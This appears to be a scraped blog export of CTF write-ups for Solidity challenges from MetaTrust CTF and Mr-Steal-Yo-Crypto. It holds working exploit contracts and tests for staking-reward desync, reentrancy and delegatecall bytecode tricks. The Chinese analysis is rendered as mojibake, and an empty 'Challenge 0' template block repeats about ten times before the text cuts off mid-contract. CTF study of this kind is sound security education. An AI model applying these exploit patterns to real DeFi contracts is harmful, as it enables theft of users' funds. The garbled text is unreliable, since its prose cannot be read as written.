12345678910// requset1 user.amount &gt; 0// requset2pending = user.amount * (accTokenPerShare[rewardTokens[i]]) / (PRECISION_FACTOR[rewardTokens[i]]) - (user.rewardDebt[rewardTokens[i]]);pending &gt; 0// requset3// å¦‚æœ pending &gt; ERC20(rewardTokens[i]).balanceOf(address(pool))// åˆ™å¯ä»¥ä¸€æ¬¡æ€§å°†poolæ± çš„å¥–åŠ±æç©º pending å— user.amountï¼ŒaccTokenPerShare[rewardTokens[i]]ï¼ŒPRECISION_FACTOR[rewardTokens[i]]å’Œuser.rewardDebt[rewardTokens[i]]å½±å“ï¼Œåˆ†æè¿™ä¸ªå€¼ 12345678910111213141516171819// user.amountuser.amount = user.amount + (_amount);// accTokenPerShare[rewardTokens[i]]bscsReward = _getMultiplier(lastRewardBlock, block.number) * (rewardPerBlock[rewardTokens[i]]);accTokenPerShare[rewardTokens[i]] = accTokenPerShare[rewardTokens[i]] + (bscsReward * (PRECISION_FACTOR[rewardTokens[i]]) / (stakedTokenSupply));// PRECISION_FACTOR[rewardTokens[i]]PRECISION_FACTOR[_rewardTokens[i]] = uint256(10**(uint256(30) - decimalsRewardToken)); // å®šå€¼ 10 ** 12// user.rewardDebt[rewardTokens[i]]user.rewardDebt[rewardTokens[i]] = user .amount * (accTokenPerShare[rewardTokens[i]]) / (PRECISION_FACTOR[rewardTokens[i]]); å¯ä»¥çœ‹åˆ° accTokenPerShare[rewardTokens[i]] çš„å€¼ä¸»è¦æ˜¯å— block.numberå½±å“ï¼Œä½†æ˜¯_getMultiplier(lastRewardBlock, block.number)çš„æœ€å¤§å€¼æ˜¯60ï¼Œè€Œè¿™è¿œä¸è¶³ 1000ï¼ˆ* 10 ** 23ï¼‰ï¼Œæ‰€ä»¥å¾—ä»å…¶ä»–çš„å˜é‡ï¼ˆuser.amount å’Œ user.rewardDebt[rewardTokens[i]]ï¼‰ä¸‹æ‰‹ã€‚ è¦ä½¿å¾—pendingçš„å€¼å¾ˆå¤§ï¼Œåªèƒ½å°† user.amount å˜å¾—å¾ˆå¤§ï¼Œ user.rewardDebt[rewardTokens[i]]å˜å¾—å¾ˆå°ã€‚ user.amount ï¼šå¯ä»¥é€šè¿‡æ§åˆ¶å­˜å…¥çš„é’±æ¥æ§åˆ¶å¤§å°ï¼Œä½†æ˜¯è¿™æ ·ä¸€æ¥ï¼Œå­˜çš„è¶Šå¤šï¼Œuser.rewardDebt[rewardTokens[i]]çš„å€¼åˆ™ä¼šå˜å¾—è¶Šå¤§ï¼Œè¿™ä¸ç¬¦åˆæˆ‘çš„åˆè¡·ã€‚ user.rewardDebt[rewardTokens[i]]ï¼šå…¶å€¼å—åˆ°å­˜é’±çš„å¤šå°‘æ§åˆ¶ï¼Œå­˜å¾—è¶Šå¤šï¼Œå…¶å€¼è¶Šå¤§ ä½†æ˜¯ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œpendingä¸­çš„(user.rewardDebt[rewardTokens[i]]æ˜¯æ¥æºäºä¸Šä¸€æ¬¡çš„ï¼Œæ‰€ä»¥åªè¦æƒ³åŠæ³•è®©user.amountçš„å¢å¤§å’Œuser.rewardDebt[rewardTokens[i]]ä¸åŒæ­¥å³å¯ï¼ï¼ï¼æ³¨æ„åˆ°transferå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°ä¸æ¶‰åŠuser.rewardDebt[rewardTokens[i]]å˜é‡ï¼Œåªæ¶‰åŠäº†user.amountï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡å¦ä¸€ä¸ªè´¦æˆ·å­˜å…¥å¾ˆå¤šé’±ï¼Œç„¶åé€šè¿‡transferå‡½æ•°è½¬ç»™hackerï¼Œä½¿å¾—hackerçš„user.amountå¢å¤§è€Œä¸æ”¹å˜user.rewardDebt[rewardTokens[i]]çš„å€¼ï¼Œä»è€Œä½¿å¾—pendingçš„å€¼å˜å¾—å¾ˆå¤§ã€‚ è¿™é‡Œè›®æœ‰æ„æ€çš„ï¼ŒæŒ‰ç†æ¥è¯´å¯ä»¥ä¸äº‹å‰å­˜ä¸€ç‚¹ç‚¹é’±çš„ï¼Œä½†æ˜¯å¦‚æœä¸äº‹å…ˆå­˜ä¸€ç‚¹ç‚¹çš„è¯ï¼Œå°±ä¸ä¼šæ›´æ–°user.rewardDebt[rewardTokens[i]]çš„å€¼ï¼Œæ€ä¹ˆè¯´å‘¢ï¼šå¦‚æœhelperå¾€poolé‡Œé¢å­˜é’±ï¼Œåˆ™æ˜¯ç¬¬ä¸€æ¬¡è°ƒç”¨_updatePool()ï¼Œé‚£ä¹ˆå› ä¸ºæ± å­é‡Œé¢æ˜¯ç©ºçš„ï¼Œæ‰€ä»¥å°†åœ¨ç¬¬äºŒä¸ªifè¯­å¥è¢«é€€å‡ºï¼›å½“hackeræ‰§è¡Œwithdrawå‡½æ•°æ—¶ï¼Œpendingçš„å€¼ä¾¿æ˜¯é›¶ã€‚ å› æ­¤ï¼Œæ‰§è¡Œé€»è¾‘ä¸ºï¼š hackerå…ˆdepositï¼Œä¿®æ”¹poolçš„ä½™é¢ï¼Œæ­¤æ—¶å› ä¸ºæ‰§è¡Œ_updatePool()çš„æ—¶å€™è¢«returnäº†ï¼Œæ‰€ä»¥accTokenPerShare[rewardTokens[i]]çš„å€¼æœªè¢«èµ‹å€¼æ‰€ä»¥æ˜¯0ï¼Œå› æ­¤user.rewardDebt[rewardTokens[i]]ä¹Ÿæ˜¯0 vm.roll(51)ï¼ŒåŒºå—é«˜åº¦å¢åŠ 50ä¸ªä¹‹å helperæ‰§è¡Œdepositï¼Œæ­¤æ—¶å¯ä»¥å®Œæ•´æ‰§è¡Œ_updatePoolï¼Œæ›´æ–°accTokenPerShare[rewardTokens[i]]çš„å€¼ï¼Œuser.rewardDebt[rewardTokens[i]]çš„å€¼ä¼šè¢«æ›´æ–°ï¼Œä½†æ˜¯è¿™æ˜¯helperçš„ä¸æ˜¯hackerçš„ helperæ‰§è¡Œtransferï¼Œå¢åŠ hackerçš„user.amount hackeræ‰§è¡Œwithdrawï¼Œæ­¤æ—¶å…·å¤‡å¤©æ—¶åœ°åˆ©äººå’Œï¼Œuser.amountçš„å€¼å¾ˆå¤§ï¼ŒaccTokenPerShare[rewardTokens[i]]ä¸ä¸ºé›¶ä¸”æ•°å€¼å¾ˆå¤§ï¼Œuser.rewardDebt[rewardTokens[i]]ä¸º0ï¼Œæ‰€ä»¥æ­¤æ—¶å¯ä»¥æ»¡è¶³ pending &gt; ERC20(rewardTokens[i]).balanceOf(address(pool)) å¯¹äºrewardToken2ï¼š åŒ rewardTokenï¼Œåªä¸è¿‡å¤šä¸€æ­¥è‡ªå·±ç»™è‡ªå·±è½¬è´¦çš„æ“ä½œï¼Œç»™è‡ªå·±è½¬äº”æ¬¡å³å¯ã€‚ 3. æ”»å‡»åˆçº¦123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475// SPDX-License-Identifier: UNLICENSEDpragma solidity ^0.8.0;import &quot;../../../src/MetaTrustCTF/StakingPool/StakingPoolsDeployment.sol&quot;;import &quot;forge-std/Test.sol&quot;;contract StakingPoolExploit &#123; StakingPoolsDeployment deployment; StakingPools pool; address yourAddress; ERC20 stakedToken; ERC20 rewardToken; ERC20V2 rewardToken2; StakingPoolHelper helper; constructor(address _deployment) &#123; deployment = StakingPoolsDeployment(_deployment); pool = deployment.stakingPools(); stakedToken = deployment.stakedToken(); rewardToken = deployment.rewardToken(); rewardToken2 = deployment.rewardToken2(); yourAddress = deployment.yourAddress(); helper = new StakingPoolHelper(_deployment); &#125; function pwn1() public &#123; deployment.faucet(); stakedToken.approve(address(pool), type(uint256).max); // å­˜å…¥å°‘é‡çš„stakedToken pool.deposit(1); &#125; // after 50 block function pwn2() public &#123; helper.pwn(); // get 1e8 * 1e18 rewardToken pool.withdraw(1 ether); // åˆ©ç”¨ rewardToken2 transfer æ¼æ´ for (uint i; i &lt; 5; i++) &#123; rewardToken2.transfer(address(this), rewardToken2.balanceOf(address(this))); &#125; rewardToken.transfer(yourAddress, rewardToken.balanceOf(address(this))); rewardToken2.transfer(yourAddress, rewardToken2.balanceOf(address(this))); &#125; function is_Solved() public view &#123; require(deployment.isSolved(), &quot;!sovled&quot;); &#125;&#125;contract StakingPoolHelper &#123; StakingPoolsDeployment deployment; StakingPools pool; ERC20 stakedToken; constructor(address _deployment) &#123; deployment = StakingPoolsDeployment(_deployment); pool = deployment.stakingPools(); stakedToken = deployment.stakedToken(); &#125; function pwn() public &#123; // é¢†å– stakedToken deployment.faucet(); stakedToken.approve(address(pool), type(uint256).max); // å­˜å…¥å¤§é‡çš„ stakedToken pool.deposit(1 ether); // å°†è¿™äº› poolTokenè½¬ç§»ç»™ exploiterï¼Œä¿®æ”¹å…¶ user.amount pool.transfer(msg.sender, 1 ether); &#125;&#125; æµ‹è¯•ï¼š 12345678910111213141516171819202122232425262728293031323334353637//SPDX-License-Identifier: UNLICENSEDpragma solidity ^0.8.0;import &quot;forge-std/Test.sol&quot;;import &quot;./StakingPoolExploit.sol&quot;;contract TestStakingPoolExploit is Test &#123; StakingPoolsDeployment deployment; StakingPools pool; StakingPoolExploit exploit; address yourAddress; function setUp() public &#123; deployment = new StakingPoolsDeployment(); pool = deployment.stakingPools(); exploit = new StakingPoolExploit(address(deployment)); yourAddress = deployment.yourAddress(); &#125; function test_isSolved() public &#123; // first pwn1() exploit.pwn1(); /* wait... */ // after 50 block vm.roll(51); // second pwn2() exploit.pwn2(); exploit.is_Solved(); assertEq(deployment.isSolved(), true); &#125;&#125; DeFi Maze1. è¦æ±‚ æˆåŠŸè°ƒç”¨SetUpçš„isSolved()å‡½æ•° 2. åˆ†æ æ ¹æ®SetUpçš„isSolveå‡½æ•°çœ‹åˆ°Vaultåˆçº¦çš„isSolveå‡½æ•°ï¼Œè¦æ±‚storedFlag == flagHashï¼Œå³è¦æ±‚sload(keccak256(0,32)) == flagHash == storedFlagï¼ŒprocessWithdrawalå‡½æ•°æ¶‰åŠäº†ä¿®æ”¹slot(keccak256(0,32))æ’æ§½çš„å€¼ï¼Œä½†åªèƒ½é€šè¿‡platformAddressæ¥è°ƒç”¨ï¼ŒrequestWithdrawal()å‡½æ•°æ¶‰åŠè°ƒç”¨é€šè¿‡ï¼Œä½†æ˜¯éœ€è¦æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶deposits[msg.sender] &gt;= amount &gt;= 7 etherï¼ŒyieldCalculated[msg.sender] == trueï¼Œè¿™ä¸¤ä¸ªæ¡ä»¶å¾ˆå¥½é€šè¿‡ï¼Œè°ƒç”¨calculateYield()å‡½æ•°ï¼Œä¼ å…¥ 1.1.1å³å¯ä½¿å¾—deposits[msg.sender]&gt;7 etherï¼Œéšåä¾¿å¯æˆåŠŸè°ƒç”¨requestWithdrawalå‡½æ•°ã€‚ 3. æ”»å‡»åˆçº¦123456789101112131415161718192021222324252627282930313233343536373839// SPDX-License-Identifier: MITpragma solidity ^0.8.16;import &quot;hardhat/console.sol&quot;;interface IVault &#123; function solved() external view returns(bool); function isSolved() external;&#125;interface IDeFiPlatform &#123; function calculateYield(uint256 principal, uint256 rate, uint256 time) external returns(uint256); function requestWithdrawal(uint256 amount) external;&#125;interface ISetUp &#123; function platfrom() external view returns(IDeFiPlatform); function vault() external view returns(IVault); function isSolved() external view returns(bool);&#125;contract MazeHacker &#123; ISetUp setup; IDeFiPlatform platfrom; IVault vault;// 0xf5a45510f4f184329E39E3D2d0825169462fC0ae constructor(address _setup) &#123; setup = ISetUp(_setup); platfrom = setup.platfrom(); vault = setup.vault(); &#125; function attack() public &#123; platfrom.calculateYield(1,1,1); platfrom.requestWithdrawal(7 ether); vault.isSolved(); require(vault.solved(), &quot;You don&#x27;t solve!&quot;); &#125;&#125; guseeGame1. è¦æ±‚ çŒœä¸­guessGame.guess()å‡½æ•°ä¸­çš„å››ä¸ªå‚æ•° 2. åˆ†æ åœ¨æ„é€ å‡½æ•°ä¸­è°ƒç”¨äº†pureFunc()å‡½æ•°ï¼Œä¿®æ”¹äº†random01 random02 random03çš„å€¼ä¸º 1 ï¼Œ2 ï¼Œ32 åˆ†æguesså‡½æ•°å¯çŸ¥ï¼Œé‡Œé¢åŒ…å«å››ä¸ªè€ƒç‚¹ ä¿®æ”¹memoryä¸­çš„ä¿ç•™ä½ç½®ï¼ˆåŠ¨æ€æ•°ç»„çš„é•¿åº¦ä¿ç•™ä½ï¼š0x60ï¼‰ï¼Œé€šè¿‡msg.valueæ§åˆ¶ï¼Œä½¿å…¶ç­‰äº1 è®¡ç®—_random02ï¼Œä½¿å…¶(uint256(uint160(address(hacker))) + 35 + _random02) &amp; 0xFF == 2 address(2)çš„è€ƒå¯Ÿï¼Œè°ƒç”¨è¯¥åœ°å€çš„å‡½æ•°ï¼Œéƒ½ä¼šè¿”å› 32 bytesçš„data è¿™ç»™è€ƒç‚¹å¾ˆç¦»è°±ï¼Œæ•™ä¼šäº†æˆ‘çœ¼è§ä¸ä¸€å®šä¸ºå®ï¼Œè¿™é‡Œçš„é¢˜ä¸­åˆå§‹åŒ–çš„A åˆçº¦åœ°å€å¹¶ä¸æ˜¯çœ¼è§çš„ A ï¼Œè€Œæ˜¯å¦æœ‰ä¸€ä¸ªåˆçº¦ï¼Œä½¿å¾—è¿”å›çš„ç»“æœå¹¶ä¸æ˜¯10ï¼Œæ‰€ä»¥è¿™é‡Œè¿˜å¾—é€šè¿‡å‡½æ•°è°ƒç”¨æ±‚å‡ºæ¥ï¼Œä¸èƒ½ç›´æ¥å†™æ­»ç­‰äº10ã€‚ 3. æ”»å‡»åˆçº¦12345678910111213141516171819202122232425262728293031323334353637383940414243contract GuessGameExploit &#123; SetUp setup; A a ; GuessGame game; constructor(address _setup) &#123; setup = SetUp(_setup); a = setup.a(); game = setup.guessGame(); &#125; function pwn() public payable &#123; require(msg.value == 1, &quot;You must pay 1 wei&quot;); // to set arr.length to be 1. uint256 _random01 = 0x60; // location(arr.length) == 0x60 // make the result of addtion equal 2 uint256 _random02 = cal_random02(); // address(2).call(&quot;anything&quot;) will return data(the length is 32bytes) uint256 _random03 = 2; // will be address(2) // read random04.number uint256 _random04 = a.number(); game.guess&#123;value:1&#125;(_random01, _random02, _random03, _random04); &#125; function cal_random02() internal view returns(uint _random02) &#123; while(true) &#123; if ((uint256(uint160(address(this))) + 35 + _random02) &amp; 0xFF == 2) &#123; break; &#125; _random02++; &#125; &#125; fallback() external payable &#123;&#125;&#125; NaryaRegistry1. è¦æ±‚ è§¦å‘FLAGäº‹ä»¶ã€‚ 2. åˆ†æ ä¸éš¾å‘ç°ï¼Œè§¦å‘FLAGçš„å‰ææ˜¯å°† hackerçš„balanceså‡åˆ° 0xDAOï¼Œå³3488ã€‚ æ¶‰åŠä¿®æ”¹balanceçš„å‡½æ•°åªæœ‰pwn()ï¼Œåˆ†æpwn()å‡½æ•° 12345678910111213141516171819202122232425262728function pwn(uint256 _amount) public &#123; address sender = msg.sender; require(PwnLogs[sender] == 0, &quot;Only ONCE. No More!&quot;); if ( _amount &lt; records1[sender] || _amount &lt; records2[sender] || records1[sender] + (records2[sender]) != _amount ) &#123; return; &#125; if (balances[sender] &gt;= _amount) &#123; records1[sender] = records2[sender]; records2[sender] = _amount; (bool result, ) = sender.call( abi.encodeWithSignature(&quot;PwnedNoMore(uint256)&quot;, _amount) ); if (result) &#123; result; &#125; balances[sender] = balances[sender] - (_amount); &#125; PwnLogs[sender] = 1;&#125; çœ‹å‡ºæ¥è¿›å…¥ç¬¬äºŒä¸ªifçš„è¦æ±‚æ˜¯ _amount &gt;&#x3D; records1[sender]ï¼Œ_amount &gt;&#x3D; records1[sender] records1[sender] + (records2[sender] ) &#x3D;&#x3D; _amount è€Œç¬¬äºŒä¸ªifçš„æ“ä½œåˆ™æ˜¯ records1[sender] &#x3D; records2[sender]; records2[sender] &#x3D; _amount; ç»¼ä¸Šï¼Œå¯ä»¥çœ‹å‡ºè¿™å’Œæ–æ³¢é‚£å¥‘æ•°åˆ—çš„è®¡ç®—æ–¹å¼ç‰¹åˆ«ç›¸ä¼¼ï¼ï¼ï¼ æˆ‘è¦åšçš„æ˜¯ï¼Œè®©balance[hacker] - (59425114757512643212875124 - records1[msg.sender] - records2[msg.sender])ï¼Œè€Œ59425114757512643212875124 è¿™ä¸ªæ•°å¾ˆå¥‡æ€ªï¼Œchatgptä¸€ä¸‹ï¼Œå‡å¦‚æ–æ³¢é‚£å¥‘æ•°åˆ—ä»¥[1,1â€¦]å¼€å¤´çš„è¯ï¼Œåˆ™è¯¥å€¼æ˜¯å‰ 122 é¡¹çš„å’Œã€‚ sender.call(abi.encodeWithSignature(&quot;PwnedNoMore(uint256)&quot;, _amount)è¿™é‡Œæä¾›äº†é‡å…¥æ¼æ´ï¼Œå‡å¦‚æˆ‘è°ƒç”¨ä¸€æ¬¡pwn(2)ï¼Œå†é‡å…¥ 121æ¬¡çš„è¯ï¼Œåˆ™æ°å¥½å¯ä»¥å°† 59425114757512643212875122 å‡æ‰ã€‚ _amountçš„å€¼çš„å˜åŒ–ä¸ºï¼špwn(2)&#x3D;&gt;pwn(3)&#x3D;&gt;pwn(5)&#x3D;&gt;â€¦&#x3D;&gt;pwn(14028366653498915298923761)&#x3D;&gt;pwn(22698374052006863956975682) ä¸ºäº†é…åˆcallTimeså’Œ_amountçš„å˜åŒ–ï¼Œå¯ä»¥æ„å»ºä¸€ä¸ªæ–æ³¢é‚£å¥‘æ•°åˆ—ã€‚ remixä¸Šåšä¸äº†ï¼Œé‡å…¥50å¤šæ¬¡åˆ™ä¼šé€€å‡ºï¼Œå¯ä»¥é‡‡ç”¨foundryæ¥æµ‹è¯• 3. æ”»å‡»åˆçº¦1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253// SPDX-License-Identifier: MITpragma solidity ^0.8.4;import &quot;../../../src/MetaTrustCTF/NaryaRegistry/NaryaRegistry.sol&quot;;import &quot;forge-std/Test.sol&quot;;contract NaryaRegistryExploit &#123; NaryaRegistry register; uint256[] amounts; uint256 callTimes; constructor(address _register) &#123; register = NaryaRegistry(_register); initializes(); &#125; function pwn() public &#123; // 1. register() =&gt; records1[msg.sender] = 1, records2[msg.sender] = 1; register.register(); // 2. parameter = 2, because: amount = records1[msg.sender] + records2[msg.sender] = 2 register.pwn(2); // 3. judge hacked register.identifyNaryaHacker(); require(register.isNaryaHacker(address(this)), &quot;!solved&quot;); &#125; // init the array of fabonacci function initializes() internal &#123; uint a = 1; uint b = 1; uint c; for(uint i; i &lt; 121; i++) &#123; c = a + b; amounts.push(c); a = b; b = c; &#125; &#125; function PwnedNoMore(uint256) public &#123; if (callTimes &lt; 121) &#123; ++callTimes; // save gas register.pwn(amounts[callTimes]); &#125; &#125;&#125; æµ‹è¯•ï¼š 1234567891011121314151617181920212223242526// SPDX-License-Identifier: MITpragma solidity ^0.8.4;import &quot;forge-std/Test.sol&quot;;import &quot;./NaryaRegistryExploit.sol&quot;;contract TestNaryaRegistryExploit is Test&#123; NaryaRegistry registry; NaryaRegistryExploit exploit; function setUp() public &#123; registry = new NaryaRegistry(); exploit = new NaryaRegistryExploit(address(registry)); &#125; function test_isSolved() public &#123; // pwn() exploit.pwn(); // output the balances[exploit] console2.log(&quot;balances[exploit]=&gt;&quot;, registry.balanceOf(address(exploit))); // assert assertEq(registry.isNaryaHacker(address(exploit)), true); &#125;&#125; ç»“æœï¼š ![image-20231118190025487](MetaTrust CTF&#x2F;image-20231118190025487.png) byteDance1. è¦æ±‚ è¦æ±‚å°†åˆçº¦ä¸­çš„solvedä¿®æ”¹ä¸ºtrueã€‚ 2. åˆ†æ åˆ†æcheckCodeå‡½æ•°ï¼Œé€šè¿‡æ¡ä»¶åˆ™æ˜¯è¦æ±‚_yourcontractçš„runtimecode å…¨ä¸ºå¥‡æ•° è¦æ±‚runtimecodeä¸­åŒ…å«åº”è¯¥bytedance è¦æ±‚æˆåŠŸæ‰§è¡Œdelegatecall å¾ˆæ˜¾ç„¶ï¼Œçªç ´å£åœ¨äºdelegatecallï¼Œé€šè¿‡æ‰§è¡Œ_yourcontractä¿®æ”¹solvedçš„å€¼ã€‚bytedanceå¯ä»¥é€šè¿‡ä»£ç å°†å…¶ç®—å‡ºæ¥ï¼Œ0-2**8ä¹‹é—´æ‰€æœ‰æ»¡è¶³æ¡ä»¶çš„ä¸”ä¸ºå¥‡æ•°çš„opcodeâ€™s numberå¦‚ä¸‹ 12345678opcode=&gt; 129opcode=&gt; 153opcode=&gt; 165opcode=&gt; 189opcode=&gt; 195opcode=&gt; 219opcode=&gt; 231opcode=&gt; 255 å®é™…ä¸Šå¥½ç”¨çš„æ˜¯0x81ï¼Œå¤åˆ¶æ ˆé¡¶ç¬¬äºŒä¸ªå…ƒç´ ï¼Œå› ä¸ºslot(solved)&#x3D;0ï¼Œä¸”é¢˜ç›®è¦æ±‚å­—èŠ‚ç å¿…é¡»æ˜¯å¥‡æ•°ï¼Œè¿™é‡Œå¯ä»¥é‡‡ç”¨subçš„æ–¹å¼è·å–0è¿™ä¸ªå€¼ã€‚ ç¼–å†™çš„å­—èŠ‚ç ä¸ºï¼š619999619999619999810355ã€‚ 12345678OPCODE number valuePUSH2 61 9999PUSH2 61 9999PUSH2 61 9999DUP2 81SUB 03SSTORE 55 3. æ”»å‡»åˆçº¦123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263contract ByteDanceExploit &#123; ByteDance dance; ByteDanceHelper helper; uint8[] public res; constructor(address _dance) &#123; dance = ByteDance(_dance); helper = new ByteDanceHelper(); &#125; function pwn() public &#123; dance.checkCode(address(helper)); require(dance.isSolved(), &quot;!solved&quot;); &#125; function search_Opcode() public &#123; bool loop; for (uint256 i; i &lt;= 0xFF; i++) &#123; loop = false; for (uint8 j; j &lt; 4; j++) &#123; uint8 binLeft = uint8(i) &gt;&gt; (uint8(7)-j) &amp; 0x01; uint8 binRight = uint8(i) &gt;&gt; j &amp; 0x01; if (binLeft != binRight) &#123; loop = true; break; &#125; &#125; if (!loop &amp;&amp; i % 2 == 1) &#123; res.push(uint8(i)); console.log(&quot;opcode=&gt;&quot;,i); &#125; &#125; &#125;&#125;contract ByteDanceHelper &#123; constructor() &#123; /* sstore(0, 9999) =&gt; to set `solved = true` opcode number value PUSH2 61 9999 PUSH2 61 9999 PUSH2 61 9999 DUP2 81 SUB 03 SSTORE 55 */ bytes memory runtimecode = hex&quot;619999619999619999810355&quot;; assembly &#123; return(add(runtimecode, 0x20), mload(runtimecode)) &#125; &#125;&#125;","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"MetaTrust CTF","slug":"CTFS/MetaTrust-CTF","permalink":"https://biyouqiuqiu.com/categories/CTFS/MetaTrust-CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"}]},{"title":"Mr-Steal-Yo-Crypto(11-20)","slug":"CTFS/Mr Steal Yo Crypto/Mr-Steal-Yo-Crypto(11-20)","date":"2023-09-09T03:50:10.000Z","updated":"2023-09-09T03:50:10.000Z","comments":true,"path":"2023/09/09/CTFS/Mr Steal Yo Crypto/Mr-Steal-Yo-Crypto(11-20)/","link":"","permalink":"https://biyouqiuqiu.com/2023/09/09/CTFS/Mr%20Steal%20Yo%20Crypto/Mr-Steal-Yo-Crypto(11-20)/","excerpt":"","text":"Challenge 0 -1. question 2. analysis 3. solveæ”»å‡»åˆçº¦ 12345```*tsæ–‡ä»¶ä»£ç *```js Challenge 0 -1. question 2. analysis 3. solveæ”»å‡»åˆçº¦ 12345```*tsæ–‡ä»¶ä»£ç *```js Challenge 0 -1. question 2. analysis 3. solveæ”»å‡»åˆçº¦ 12345```*tsæ–‡ä»¶ä»£ç *```js Challenge 0 -1. question 2. analysis 3. solveæ”»å‡»åˆçº¦ 12345```*tsæ–‡ä»¶ä»£ç *```js Challenge 0 -1. question 2. analysis 3. solveæ”»å‡»åˆçº¦ 12345```*tsæ–‡ä»¶ä»£ç *```js Challenge 0 -1. question 2. analysis 3. solveæ”»å‡»åˆçº¦ 12345```*tsæ–‡ä»¶ä»£ç *```js Challenge 0 -1. question 2. analysis 3. solveæ”»å‡»åˆçº¦ 12345```*tsæ–‡ä»¶ä»£ç *```js Challenge 0 -1. question 2. analysis 3. solveæ”»å‡»åˆçº¦ 12345```*tsæ–‡ä»¶ä»£ç *```js Challenge 0 -1. question 2. analysis 3. solveæ”»å‡»åˆçº¦ 12345```*tsæ–‡ä»¶ä»£ç *```js Challenge 0 -1. question 2. analysis 3. solveæ”»å‡»åˆçº¦ 12345```*tsæ–‡ä»¶ä»£ç *```js","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"Mr Steal Yo Crypto","slug":"CTFS/Mr-Steal-Yo-Crypto","permalink":"https://biyouqiuqiu.com/categories/CTFS/Mr-Steal-Yo-Crypto/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"}]},{"title":"Mr-Steal-Yo-Crypto(1-10)","slug":"CTFS/Mr Steal Yo Crypto/Mr-Steal-Yo-Crypto(1-10)","date":"2023-09-09T03:50:10.000Z","updated":"2023-09-09T03:50:10.000Z","comments":true,"path":"2023/09/09/CTFS/Mr Steal Yo Crypto/Mr-Steal-Yo-Crypto(1-10)/","link":"","permalink":"https://biyouqiuqiu.com/2023/09/09/CTFS/Mr%20Steal%20Yo%20Crypto/Mr-Steal-Yo-Crypto(1-10)/","excerpt":"","text":"å‰è¨€ ğŸ“Œ è®°å½•è‡ªå·±çš„è§£é¢˜è¿‡ç¨‹ï¼Œä»¥åŠæé«˜è‡ªå·±çš„ä»£ç é˜…è¯»èƒ½åŠ›ğŸ¤ª Challenge 01 - Jpeg Sniper1. question Hopegs the NFT marketplace is launching the hyped NFT collection BOOTY soon. They have a wrapper contract: FlatLaunchpeg, which handles the public sale mint for the collection. Your task is to bypass their safeguards and max mint the entire collection in a single tx. é¢˜ç›®çš„æ„æ€æ˜¯ï¼šè·å–FlatLaunchpegä¸­çš„æ‰€æœ‰BOOTYã€‚ 2. analysis é€šè¯»ä»£ç å¯çŸ¥æœ¬é¢˜çš„æ¼æ´å‡ºç°åœ¨FlatLaunchpegåˆçº¦çš„publicSaleMintå‡½æ•°ä¸­ã€‚ 12345678910111213141516171819function publicSaleMint(uint256 _quantity) external payable isEOA atPhase(Phase.PublicSale)&#123; // è°ƒç”¨è€…çš„ä½™é¢ä»¥åŠè¦é“¸å¸çš„æ¬¡æ•°ç›¸åŠ èµ·æ¥å¿…é¡»è¦å°äº5 if (numberMinted(msg.sender) + _quantity &gt; maxPerAddressDuringMint) &#123; revert Launchpeg__CanNotMintThisMany(); &#125; // å‘è¡Œé‡å’Œé“¸å¸ä¸ªæ•°å¿…é¡»å°äº69 if (totalSupply() + _quantity &gt; collectionSize) &#123; revert Launchpeg__MaxSupplyReached(); &#125; uint256 total = salePrice * _quantity; // it is free _mintForUser(msg.sender, _quantity); _refundIfOver(total);&#125; å¯ä»¥çœ‹åˆ°è¯¥é¢˜æœ‰ä¸¤ä¸ªä¿®é¥°å™¨ï¼ŒisEOAé™åˆ¶çš„è°ƒç”¨è€…çš„ä»£ç é‡ä¸ºé›¶ï¼Œè¨€å¤–ä¹‹æ„å°±æ˜¯éœ€è¦è°ƒç”¨è€…ä¸ºEOAè´¦æˆ·ï¼Œä½†æ˜¯ï¼Œåˆçº¦åœ¨åˆ›å»ºæ—¶çš„ä»£ç å¤§å°ä¹Ÿä¸º0ï¼Œå³åœ¨æ„é€ å‡½æ•°ä¸­ã€‚è‡³äºatPhaseä¿®é¥°å™¨å˜›ï¼Œæˆ‘æ„Ÿè§‰å½¢åŒè™šè®¾ï¼ŒcurrentPhase()çš„è¿”å›å€¼éƒ½æ˜¯Phase.PublicSaleã€‚ æ¥ä¸‹æ¥çœ‹åˆ°å‡½æ•°ä½“ï¼Œè¦æ±‚è°ƒç”¨è€…çš„ä½™é¢ä»¥åŠå¾…é“¸å¸ä¸ªæ•°çš„æ€»å’Œå°äº5ï¼ˆmaxPerAddressDuringMintï¼‰ï¼Œä¸”ç³»ç»Ÿå½“å‰çš„å‘è¡Œé‡ä»¥åŠå¾…é“¸å¸ä¸ªæ•°çš„æ€»å’Œå°äº69ï¼ˆcollectionSizeï¼‰ã€‚åªè¦é€šè¿‡åˆ›å»ºå¤šä¸ªå®ä¾‹ï¼Œå¹¶åœ¨ä»–ä»¬çš„æ„é€ å‡½æ•°ä¸­å®Œæˆé“¸å¸ä»¥åŠè½¬è´¦å³å¯ã€‚ è¿™é¢˜è¿˜æœ‰ä¸ªéš¾ç‚¹å°±æ˜¯gas run out ofé—®é¢˜ï¼Œå¿…é¡»èƒ½çœåˆ™çœï¼Œèƒ½ä¸å£°æ˜stroageå˜é‡åˆ™ä¸å£°æ˜ï¼Œä¸”åˆ›å»ºçš„æ¯ä¸€ä¸ªåˆçº¦éƒ½éœ€è¦æ‰§è¡Œselfdestruct()æ“ä½œï¼Œèƒ½è¿”å›ä¸€éƒ¨åˆ†gasã€‚ 3. solveæ”»å‡»åˆçº¦ 1234567891011121314151617181920212223242526272829// SPDX-License-Identifier: MITpragma solidity ^0.8.4;import &quot;./FlatLaunchpeg.sol&quot;;import &quot;hardhat/console.sol&quot;;contract FlatLaunchpegHacker &#123; constructor(FlatLaunchpeg flatlaunchpeg) &#123; for (uint256 i = 0; i &lt; 69; i += 3) &#123; // 23 times console.log(&quot;startIndex = &quot;, i); new FlatLaunchpegHackerHepler(flatlaunchpeg, 3, i, msg.sender); &#125; &#125;&#125;contract 